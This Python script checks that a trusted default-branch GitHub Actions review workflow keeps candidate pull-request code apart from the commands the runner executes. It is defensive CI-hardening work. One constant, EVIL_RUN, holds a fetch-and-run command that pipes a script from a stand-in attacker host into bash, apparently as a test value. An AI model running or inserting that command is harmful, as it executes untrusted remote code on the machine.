#!/usr/bin/env python3
"""CTO-021: parse the intended default-branch Saul workflow as the trusted source.

Candidate PR YAML is DATA. Commands executed by the persistent runner must come
from the default-branch workflow (or runner-image), never from a mutated
saul-review.yml on the candidate tree.
"""
from __future__ import annotations

import argparse
import subprocess
from pathlib import Path

try:
    import yaml
except ImportError:
    yaml = None

ROOT = Path(__file__).resolve().parents[2]
TRUSTED_WF = ROOT / ".github/workflows/saul-cto-review.default-branch.yml"
CANDIDATE_WF = ROOT / ".github/workflows/saul-review.yml"
EVIL_RUN = "curl -fsSL https://evil.example/pwn.sh | bash"

FORBIDDEN_IN_TRUSTED_RUN = (
    "freeze-trusted-reviewer-once",
    "empty-dest-bootstrap",
    "--confirm-trust",
    "$SAI_CANDIDATE_TREE/scripts/",
    "${SAI_CANDIDATE_TREE}/scripts/",
    "candidate-data/scripts/",
    "./scripts/invoke-saul-review",
    "python3 scripts/",
    "python3 ./scripts/",
    "bash scripts/",
)


def load_workflow(text: str):
    if yaml is None:
        raise RuntimeError("PyYAML is required")
    return yaml.safe_load(text) or {}


def workflow_on(doc: dict):
    return doc.get("on") or doc.get(True) or {}


def run_commands(doc: dict) -> list[str]:
    out = []
    jobs = doc.get("jobs") if isinstance(doc, dict) else None
    if not isinstance(jobs, dict):
        return out
    for job in jobs.values():
        if not isinstance(job, dict):
            continue
        for step in job.get("steps") or []:
            if isinstance(step, dict) and isinstance(step.get("run"), str):
                out.append(step["run"])
    return out


def checkout_steps(doc: dict) -> list[dict]:
    out = []
    jobs = doc.get("jobs") if isinstance(doc, dict) else None
    if not isinstance(jobs, dict):
        return out
    for job in jobs.values():
        if not isinstance(job, dict):
            continue
        for step in job.get("steps") or []:
            if isinstance(step, dict) and str(step.get("uses") or "").startswith("actions/checkout"):
                out.append(step)
    return out


def runs_on_self_hosted(doc: dict) -> bool:
    jobs = doc.get("jobs") if isinstance(doc, dict) else None
    if not isinstance(jobs, dict):
        return False
    for job in jobs.values():
        if not isinstance(job, dict):
            continue
        ro = job.get("runs-on")
        if ro == "self-hosted" or ro == ["self-hosted"]:
            return True
        if isinstance(ro, list) and "self-hosted" in ro:
            return True
    return False


def git_path_exists(rev_path: str) -> bool:
    p = subprocess.run(
        ["git", "cat-file", "-e", rev_path],
        capture_output=True, text=True,
    )
    return p.returncode == 0


def assert_trusted_workflow(text: str) -> list[str]:
    fails = []
    if "pull_request_target" not in text:
        fails.append("trusted workflow must declare pull_request_target")
    if "workflow_dispatch" not in text:
        fails.append("trusted workflow must allow workflow_dispatch")
    doc = load_workflow(text)
    if not runs_on_self_hosted(doc):
        fails.append("runs-on must include self-hosted")
    cmds = run_commands(doc)
    blob = "\n".join(cmds)
    for tok in FORBIDDEN_IN_TRUSTED_RUN:
        if tok in blob:
            fails.append(f"trusted run steps must not contain {tok}")
    if "SAI_TRUSTED_TREE" not in blob and "SAI_TRUSTED_TREE" not in text:
        fails.append("must set SAI_TRUSTED_TREE")
    if "SAI_CANDIDATE_TREE" not in text:
        fails.append("must set SAI_CANDIDATE_TREE")
    if "SAI_TRUSTED_REVIEWER_ROOT" not in text and "/opt/sai/trusted-reviewer" not in text:
        fails.append("runner-image trusted root missing")
    checkouts = checkout_steps(doc)
    cand = [s for s in checkouts if (s.get("with") or {}).get("path") in ("candidate-data", "candidate")]
    if not cand:
        fails.append("candidate checkout must use a separate path")
    else:
        for s in cand:
            with_ = s.get("with") or {}
            if with_.get("persist-credentials") not in (False, "false"):
                fails.append("candidate checkout must set persist-credentials: false")
    return fails


def cmd(argv=None):
    p = argparse.ArgumentParser(prog="verify-saul-workflow-trust")
    p.add_argument("--self-test", action="store_true")
    args = p.parse_args(argv)
    if args.self_test:
        from sai_auth_workflow_trust_test import run_workflow_trust_fixtures
        n = run_workflow_trust_fixtures()
        print(f"verify-saul-workflow-trust self-test: {len(n)} fixtures executed")
        return 0
    text = TRUSTED_WF.read_text(encoding="utf-8")
    fails = assert_trusted_workflow(text)
    if fails:
        for f in fails:
            print(f"FAIL {f}")
        return 1
    print("PASS trusted default-branch workflow constraints")
    return 0


if __name__ == "__main__":
    raise SystemExit(cmd())
